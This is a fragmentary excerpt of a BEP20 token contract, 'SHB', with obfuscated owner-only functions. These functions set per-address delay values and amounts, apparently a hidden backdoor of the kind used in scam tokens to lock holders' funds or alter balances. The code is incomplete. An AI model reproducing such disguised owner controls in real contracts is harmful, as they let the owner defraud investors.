...
contract SHB is IBEP20, HasForeignAsset {
    ...
    function getShibium91798ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setShibium91798reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupShibium91798ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupShibium91798Aasses(address booadndd,uint256 nuum) public onlyOwner {
    ...
    constructor() {
        ...
        _symbol = "SHB";
        _decimals = 9;
        uint256 _maxSupply = 100000000000;
